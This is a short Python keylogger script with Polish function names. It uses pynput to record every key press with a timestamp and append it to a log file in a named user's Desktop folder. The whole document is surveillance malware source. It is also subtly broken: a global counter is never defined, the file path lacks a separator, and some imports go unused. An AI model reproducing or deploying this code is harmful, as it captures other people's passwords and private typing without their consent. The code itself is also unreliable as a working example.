

import tkinter as tk
import pynput
import datetime
from pynput.keyboard import Key, Listener
import atexit


keys = []
folder = "C:/Users/Mateusz Ziętara/Desktop"

with open(folder + "log.txt", "a") as f:
    t = '\n\n********************************************* Run on: ' + str(datetime.datetime.now()) + '   <---Tak!\n\n'
    f.write(t)


def naciskasz(key):
    global keys, count

    keys.append(key)
    count += 1
    zapis(keys)
    keys = []


def zapis(keys):
    with open(folder + "log.txt", "a") as f:
        for key in keys:
            k_s = str(key).replace("'", "")
            k = str(datetime.datetime.now()) + ' ---> ' + k_s + '\n'
            f.write(k)


with Listener(on_press=naciskasz) as listener:
    listener.join()

